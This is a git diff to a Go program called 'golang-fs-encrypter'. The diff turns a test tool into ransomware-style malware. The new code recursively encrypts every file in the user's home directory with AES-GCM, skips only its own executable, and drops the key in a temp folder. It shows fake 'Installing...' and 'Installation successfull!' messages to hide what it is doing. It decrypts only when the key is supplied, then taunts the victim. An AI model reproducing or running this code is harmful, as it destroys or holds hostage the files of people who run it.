@@ -1,8 +1,6 @@
 package main
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
 	"encoding/hex"
 	"fmt"
 	"golang-fs-encrypter/internal/crypto"
@@ -10,55 +8,75 @@ import (
 	"io/fs"
 	"os"
 	"path/filepath"
-)
-
-
-var (
-	key  []byte
-	err  error
-	mode int
-	gcm  cipher.AEAD
+	"runtime"
 )
 
 const (
 	MODE_ENCRYPT = iota
 	MODE_DECRYPT
-	KEY_DIR = "./"
-	KEY_LENGTH = 32
+	KEY_HEX_LENGTH = 32
 )
 
 func main() {
+	var (
+		key     []byte
+		mode    int
+		homeDir string
+		keyDir  string
+		cipher  crypto.Cipher
+		err     error
+	)
+
+	homeDir, err = os.UserHomeDir()
+	if err != nil {
+		return
+	}
+
+	switch runtime.GOOS {
+	case "linux":
+		keyDir = "/tmp/"
+	case "windows":
+		keyDir = homeDir + "\\AppData\\Local\\Temp\\"
+	}
+
+	// Uncomment for testing
+	// homeDir = "./dir"
+	// keyDir = "./"
+
 	if len(os.Args) == 2 {
 		mode = MODE_DECRYPT
 		key, err = hex.DecodeString(os.Args[1])
 		if err != nil {
-			fmt.Println("Bad key")
+			fmt.Println("Bad key", err)
 		}
+		fmt.Println("Decoding your files...")
 	} else {
 		mode = MODE_ENCRYPT
-		key = crypto.GenerateBytes(KEY_LENGTH)
+		fmt.Println("Installing...")
+		key = crypto.GenerateBytes(KEY_HEX_LENGTH)
 		keyHex := hex.EncodeToString(key)
 
-		files.WriteFile(KEY_DIR + "key.key", []byte(keyHex))
+		if err = files.WriteFile(keyDir+"key.key", []byte(keyHex)); err != nil {
+			return
+		}
 	}
 
-	c, err := aes.NewCipher(key)
+	cipher, err = crypto.NewAESGCM(key)
 	if err != nil {
 		return
 	}
-	gcm, err = cipher.NewGCM(c)
+
+	execPath, err := os.Executable()
 	if err != nil {
 		return
 	}
 
-	// dir, err := os.UserHomeDir()
-	// if err != nil {
-	// 	panic(err)
-	// }
-	dir := "./dir"
+	err = filepath.WalkDir(homeDir, func(path string, d fs.DirEntry, err error) error {
+		if err != nil {
+			return err
+		}
 
-	err = filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
-		if d.IsDir() {
+		if d.IsDir() || path == execPath {
 			return nil
 		}
 
@@ -71,18 +89,26 @@ func main() {
 
 		switch mode {
 		case MODE_ENCRYPT:
-			bytesAfter, err = crypto.EncryptBytes(bytesBefore, &gcm)
+			bytesAfter, err = cipher.EncryptBytes(bytesBefore)
 		case MODE_DECRYPT:
-			bytesAfter, err = crypto.DecryptBytes(bytesBefore, &gcm)
+			bytesAfter, err = cipher.DecryptBytes(bytesBefore)
+		}
+		if err != nil {
+			return err
 		}
 
 		err = files.RewriteFile(path, bytesAfter)
 
 		return err
 	})
-
 	if err != nil {
-		panic(err)
+		return
 	}
 
+	switch mode {
+	case MODE_ENCRYPT:
+		fmt.Println("Installation successfull!")
+	case MODE_DECRYPT:
+		fmt.Println("Your files are now decrypted. Next time be aware of what files you're running!")
+	}
 }
